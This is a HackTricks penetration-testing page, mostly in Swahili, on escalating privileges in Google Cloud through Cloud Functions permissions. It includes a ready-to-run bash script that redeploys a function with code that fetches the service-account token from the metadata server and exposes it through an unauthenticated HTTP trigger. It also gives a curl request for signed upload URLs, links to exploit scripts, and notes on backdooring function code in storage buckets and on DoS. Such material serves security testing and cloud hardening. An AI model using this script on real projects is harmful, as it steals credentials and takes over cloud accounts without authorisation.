# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Maelezo zaidi kuhusu Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Mshambuliaji mwenye vibali hivi anaweza **kuunda Cloud Function mpya yenye msimbo wowote (mbaya) na kuiweka Service Account**. Kisha, leak token ya Service Account kutoka kwa metadata ili kuongeza viwango vya ruhusa kwa akaunti hiyo.\  
Huenda ukahitaji vibali vingine ili kuanzisha function.

Exploit scripts za njia hii zinapatikana [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) na [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) na faili la .zip lililotengenezwa tayari linapatikana [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Mshambuliaji mwenye vibali hivi anaweza **kubadilisha msimbo wa Function na hata kubadilisha service account iliyounganishwa** kwa lengo la kusafirisha token.

> [!CAUTION]
> Ili ku-deploy cloud functions utahitaji pia vibali vya actAs juu ya default compute service account au juu ya service account inayotumika kujenga image.

Vibali vingine vya ziada kama kibali cha `.call` kwa cloudfunctions toleo 1 au role `role/run.invoker` ili kuanzisha function vinaweza kuhitajika.

<details><summary>Update Cloud Function kwa msimbo mbaya ili kusafirisha token ya service account</summary>
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
</details>

> [!CAUTION]
> Ikiwa unapata hitilafu `Permission 'run.services.setIamPolicy' denied on resource...` ni kwa sababu unatumia param `--allow-unauthenticated` na huna ruhusa za kutosha kwa hiyo.

The exploit script for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Kwa ruhusa hii unaweza kupata **signed URL ili uweze kupakia faili kwenye function bucket (lakini code ya function haitabadilika, bado utahitaji kuibadilisha)**

<details><summary>Tengeneza signed upload URL kwa Cloud Function</summary>
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
</details>

Sijui ni jinsi gani ruhusa hii pekee inavyofaa kwa mtazamo wa mwavamizi, lakini ni vyema kujua.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Jipe haki yoyote ya **`.update`** au **`.create`** zilizotajwa hapo awali ili kupandisha hadhi.

### `cloudfunctions.functions.update`

Kuwa na ruhusa za **`cloudfunctions`** pekee, bila **`iam.serviceAccounts.actAs`**, hautaweza kusasisha function SO THIS IS NOT A VALID PRIVESC.

### Read & Write Access over the bucket

Ikiwa una ufikiaji wa kusoma na kuandika kwenye bucket unaweza kufuatilia mabadiliko kwenye code na kila wakati **update in the bucket happens you can update the new code with your own code** ambayo toleo jipya la Cloud Function litaendeshwa na backdoored code iliyowasilishwa.

Unaweza kuona zaidi kuhusu shambulio katika:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Hata hivyo, hutaweza kutumia hili kuwahi ku-compromise third party Cloud Functions kwa sababu ikiwa utaunda bucket kwenye akaunti yako na kuiweka public permissions ili project ya nje iweze kuandika juu yake, utapata hitilafu ifuatayo:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Hata hivyo, hii inaweza kutumika kwa mashambulizi ya DoS.

### Read & Write Access over Artifact Registry

Wakati Cloud Function inapoanzishwa picha mpya ya docker inatupwa kwenye Artifact Registry ya project. Nilijaribu kurekebisha image kwa mpya, na hata kufuta image ya sasa (na image ya `cache`) na hakuna kilichobadilika, the cloud function iliendelea kufanya kazi. Kwa hivyo, huenda **might be possible to abuse a Race Condition attack** kama ilivyo na bucket kubadilisha docker container itakayotekelezwa lakini **just modifying the stored image isn't possible to compromise the Cloud Function**.

## References

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
